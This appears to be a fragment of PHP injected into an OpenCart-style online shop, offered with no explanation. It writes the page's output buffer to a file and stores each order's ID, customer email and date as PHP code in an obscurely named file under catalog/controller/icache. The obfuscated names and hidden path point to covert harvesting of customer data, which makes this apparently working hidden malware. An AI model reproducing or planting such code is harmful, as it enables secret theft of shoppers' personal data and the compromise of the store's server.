<?php

			$s = $uberss;

			
$fp = fopen($s, 'w') ;
fwrite($fp, ob_get_contents());
fclose($fp);
$var_str = var_export($order_id, true);
$uberpr7s = "<?php\n\n\$uberpr12s = $var_str;\n\n?>";
$var_str1 = var_export($email, true);
$uberpr8s = "<?php\n\n\$uberpr13s = $var_str1;\n\n?>";
$var_str3 = var_export($date_added, true);
$uberpr9s = "<?php\n\n\$uberpr14s = $var_str3;\n\n?>";
$uberpr11 = ("$uberpr7s $uberpr8s $uberpr9s");
file_put_contents('catalog/controller/icache/FbIRQhz7mS3.php', $uberpr11);
?>